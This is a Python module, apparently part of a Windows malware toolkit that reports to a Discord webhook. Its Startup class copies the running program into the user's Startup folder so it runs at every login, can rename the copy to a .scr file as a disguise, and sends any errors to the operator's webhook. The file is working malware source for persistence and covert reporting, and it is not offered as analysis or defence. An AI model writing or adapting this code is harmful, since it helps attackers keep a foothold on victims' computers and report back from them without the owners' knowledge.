import os
import shutil
from dhooks import Embed
from config import Config
from __webhook import _WebhookX
from sys import argv

class Startup:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        self.file_path = os.path.abspath(argv[0])

    def send_error_notification(self, exception):
        cc = Config()
        webx = _WebhookX().get_object()

        embed = Embed(
            description='Error while copying to startup',
            color=16399677,
            timestamp='now'
        )

        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
        embed.add_field(name="Couldn't copy to startup or rename to scr | Help us by reporting this bug",
                        value=f'Advanced Log: ```{exception}```')

        webx.send(embed=embed)

    def copy_to_startup(self):
        cc = Config()
        try:
            startup_file_path = os.path.join(self.startup_loc, os.path.basename(self.file_path))
            shutil.copy(self.file_path, startup_file_path)
            
            if cc.use_scr:
                new_startup_file_path = os.path.splitext(startup_file_path)[0] + ".scr"
                os.rename(startup_file_path, new_startup_file_path)
        except Exception as e:
            self.send_error_notification(e)
            
